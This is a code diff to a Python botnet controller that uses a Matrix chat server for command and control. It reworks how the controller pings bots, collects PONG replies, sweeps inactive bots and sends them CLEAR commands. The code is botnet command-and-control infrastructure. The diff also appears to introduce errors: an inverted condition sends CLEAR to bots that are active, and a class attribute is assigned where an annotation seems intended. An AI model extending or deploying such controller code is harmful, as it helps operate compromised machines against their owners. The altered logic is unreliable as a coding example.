@@ -60,6 +60,7 @@ class CommandRoom:
         return False if bot_id doesnt exist
         """
         if bot_id not in self.bots:
+            print("Not exists")
             return False
         self.bots[bot_id][1] = True
         return True
@@ -84,12 +85,15 @@ class BotnetController:
     announce_room: Room
     command_rooms: dict[str, CommandRoom]
     command_room_lock: threading.Lock
+
+    recv_pongs = threading.Event
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
         self.pinging = False
         self.client = MatrixClient(MATRIX_HOMESERVER)
         self.command_rooms = {}
         self.command_room_lock = threading.Lock()
+        self.recv_pongs = threading.Event()
 
     def login(self):
         # login and sync
@@ -182,7 +186,7 @@ class BotnetController:
             # if for some reason the bots PONG is received later than or during the SWEEP
             # tell the bot to just reconnect to the botnet
             # unlikely but better safe than sorry
-            if self.command_room_lock.locked() or not self.command_rooms[room_id].set_active(bot_id):
+            if not self.recv_pongs.is_set() or self.command_rooms[room_id].set_active(bot_id):
                 self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
             
     def create_room(self, name: str) -> Room:
@@ -202,10 +206,11 @@ class BotnetController:
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.set_all_inactive()
-            
+            self.recv_pongs.set()
             self.send_to_all("PING")
             time.sleep(5) # wait a bit
             # and Sweep
+            self.recv_pongs.clear()
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.delete_inactive_bots()
